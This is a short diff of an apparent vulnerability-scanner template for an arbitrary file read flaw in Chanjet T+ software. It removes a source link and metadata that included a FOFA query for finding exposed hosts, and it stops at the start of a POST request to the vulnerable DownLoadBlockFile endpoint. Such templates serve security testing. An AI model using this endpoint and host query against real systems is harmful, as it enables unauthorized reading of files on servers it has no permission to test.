@@ -3,12 +3,8 @@ info:
   name: 畅捷通T+ DownLoadBlockFile 存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mh5mf40gvmy45bhs'
+  description: ''
   tags: lfi,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mh5mf40gvmy45bhs
-    fofa: app="畅捷通-TPlus"
 http:
 - raw:
   - 'POST /tplus/GLSyncService.asmx/DownLoadBlockFile HTTP/1.1
